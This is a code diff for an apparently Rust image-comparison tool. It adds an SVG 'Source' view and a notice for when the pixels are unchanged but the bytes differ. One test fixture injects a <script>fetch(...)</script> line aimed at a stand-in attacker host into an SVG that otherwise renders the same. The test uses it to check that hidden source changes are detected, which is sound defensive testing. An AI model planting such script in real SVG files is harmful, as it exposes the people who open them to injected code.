@@ -22,6 +22,8 @@ pub enum Mode {
     Swipe,
     Onion,
     Difference,
+    /// An SVG's source text as a line diff, in place of its rendering.
+    Source,
 }
 
 impl Mode {
@@ -31,15 +33,17 @@ impl Mode {
             Mode::Swipe => "Swipe",
             Mode::Onion => "Onion skin",
             Mode::Difference => "Difference",
+            Mode::Source => "Source",
         }
     }
 
+    /// The next rendering mode; Source is chosen directly and cycles back to the rendering.
     pub fn next(self) -> Mode {
         match self {
             Mode::TwoUp => Mode::Swipe,
             Mode::Swipe => Mode::Onion,
             Mode::Onion => Mode::Difference,
-            Mode::Difference => Mode::TwoUp,
+            Mode::Difference | Mode::Source => Mode::TwoUp,
         }
     }
 }
@@ -50,6 +54,10 @@ pub struct ImageDoc {
     pub diff: images::Diff,
     /// Union of both sizes, in image pixels.
     pub size: (u32, u32),
+    /// Both Sides' bytes are equal: pixels alone never call a comparison identical.
+    pub same_bytes: bool,
+    /// The Sides are SVG text the comparison keeps, so [`Mode::Source`] can show their line diff.
+    pub source: bool,
 }
 
 impl ImageDoc {
@@ -78,7 +86,7 @@ impl ImageDoc {
         let [old, new] = [0, 1].map(|i| sides[i].as_ref().map_or(&none, |d| &d.pixels));
         let diff = images::diff(old, new);
         let size = (old.width().max(new.width()), old.height().max(new.height()));
-        Some(Ok(ImageDoc { sides, diff, size }))
+        Some(Ok(ImageDoc { sides, diff, size, same_bytes: left.0 == right.0, source: false }))
     }
 
     /// The Difference image of `rect`, built when shown rather than kept.
@@ -139,6 +147,9 @@ impl ImageDoc {
             self.diff.changed,
             if regions == 1 { "" } else { "s" }
         ));
+        if self.diff.changed == 0 && !self.same_bytes {
+            out.push(if self.source { "the rendering is unchanged but the source differs: choose Source" } else { "the pixels are unchanged but the bytes differ" }.into());
+        }
         out
     }
 }
@@ -185,6 +196,10 @@ impl ImageMenuEntry {
                 Some("No changed regions")
             }
             ImageCommand::SetMode(mode) if state.mode() == mode => Some("Current image mode"),
+            ImageCommand::SetMode(Mode::Source) if !doc.source => Some("Only an SVG has source text"),
+            ImageCommand::CycleMode | ImageCommand::SetMode(_) => None,
+            ImageCommand::Fit | ImageCommand::ActualSize | ImageCommand::Nudge(_) | ImageCommand::Zoom { .. } | ImageCommand::Pan { .. }
+            | ImageCommand::SetSplit(_) | ImageCommand::Region { .. } if state.mode() == Mode::Source => Some("Showing the SVG source"),
             _ => None,
         }
     }
@@ -210,6 +225,10 @@ pub fn image_commands() -> &'static [ImageMenuEntry] {
         ImageMenuEntry {
             label: "Image: Difference",
             command: ImageCommand::SetMode(Mode::Difference),
+        },
+        ImageMenuEntry {
+            label: "Image: Source",
+            command: ImageCommand::SetMode(Mode::Source),
         },
         ImageMenuEntry {
             label: "Fit image",
@@ -315,10 +334,12 @@ impl ImageState {
                 * 0.95
         })
     }
-    /// False only when region navigation has no destination. All state writes live here.
+    /// False only when region navigation has no destination, or Source is asked of an image without source text.
+    /// All state writes live here.
     pub fn execute(&mut self, doc: &ImageDoc, command: ImageCommand, viewport: Viewport) -> bool {
         match command {
             ImageCommand::CycleMode => self.mode = self.mode.next(),
+            ImageCommand::SetMode(Mode::Source) if !doc.source => return false,
             ImageCommand::SetMode(mode) => self.mode = mode,
             ImageCommand::Fit => {
                 self.zoom = None;
@@ -328,7 +349,7 @@ impl ImageState {
             ImageCommand::ActualSize => self.zoom = Some(1.0),
             ImageCommand::Nudge(delta) => match self.mode {
                 Mode::Onion => self.alpha = (self.alpha + delta).clamp(0.0, 1.0),
-                Mode::TwoUp | Mode::Swipe | Mode::Difference => {
+                Mode::TwoUp | Mode::Swipe | Mode::Difference | Mode::Source => {
                     self.split = (self.split + delta).clamp(0.0, 1.0)
                 }
             },
@@ -433,10 +454,9 @@ mod tests {
         let set = ChangeSet::load(&spec, dir.path()).unwrap();
         let prepared = PreparedDocument::load(&set, 0, &left, &right, false).unwrap();
         assert!(matches!(prepared.image, Some(Err(_))));
-        assert!(matches!(
-            prepared.text.placeholder_kind(),
-            Some(Placeholder::Binary { .. })
-        ));
+        // an SVG that cannot be drawn is still text: its lines stay the comparison
+        assert!(prepared.text.placeholder_kind().is_none());
+        assert_eq!(prepared.text.lines_on(Side::Right), ["<svg invalid"]);
         assert!(
             prepared
                 .text
@@ -460,6 +480,39 @@ mod tests {
     }
 
     #[test]
+    fn an_svg_keeps_its_source_beside_a_rendering_that_does_not_show_it() {
+        use crate::{changeset::{ChangeSet, Spec}, document::PreparedDocument};
+        let dir = tempfile::tempdir().unwrap();
+        let (left, right) = (dir.path().join("old.svg"), dir.path().join("new.svg"));
+        let base = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">\n<rect width=\"16\" height=\"16\" fill=\"#f00\"/>\n</svg>\n";
+        std::fs::write(&left, base).unwrap();
+        std::fs::write(&right, base.replace("</svg>", "<script>fetch(\"https://attacker.example.invalid/\")</script>\n</svg>")).unwrap();
+        let set = ChangeSet::load(&Spec::Plain { left: left.clone(), right: right.clone() }, dir.path()).unwrap();
+        let prepared = PreparedDocument::load(&set, 0, &left, &right, false).unwrap();
+        let image = prepared.image.unwrap().unwrap();
+        assert_eq!((image.diff.changed, image.same_bytes, image.source), (0, false, true));
+        assert!(prepared.text.lines_on(Side::Right).iter().any(|l| l.starts_with("<script>")));
+        assert!(!prepared.text.is_writable(Side::Right), "the rendering opens; its source is read-only");
+        assert!(prepared.text.notes().iter().any(|n| n.contains("source differs")), "{:?}", prepared.text.notes());
+        // the shared menu offers Source for it, and the rendering's controls wait while the source shows
+        let mut state = ImageState::default();
+        let viewport = Viewport { width: 80.0, height: 24.0 };
+        let source = image_commands().iter().find(|e| e.command == ImageCommand::SetMode(Mode::Source)).unwrap();
+        assert_eq!(source.disabled(&image, &state), None);
+        assert!(state.execute(&image, source.command, viewport));
+        assert_eq!(state.mode(), Mode::Source);
+        let fit = image_commands().iter().find(|e| e.command == ImageCommand::Fit).unwrap();
+        assert_eq!(fit.disabled(&image, &state), Some("Showing the SVG source"));
+        state.execute(&image, ImageCommand::CycleMode, viewport);
+        assert_eq!(state.mode(), Mode::TwoUp, "cycling returns to the rendering");
+        // a raster image has no source to show
+        let mut raster = image;
+        raster.source = false;
+        assert_eq!(source.disabled(&raster, &ImageState::default()), Some("Only an SVG has source text"));
+        assert!(!ImageState::default().execute(&raster, source.command, viewport));
+    }
+
+    #[test]
     fn shared_menu_includes_every_mode_and_disables_empty_region_navigation() {
         let svg = br##"<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"><rect width="2" height="2" fill="#f00"/></svg>"##;
         let doc = ImageDoc::read(
@@ -475,7 +528,7 @@ mod tests {
                 .iter()
                 .filter(|e| matches!(e.command, ImageCommand::SetMode(_)))
                 .count(),
-            4
+            5
         );
         for entry in entries {
             assert!(!entry.label.is_empty());
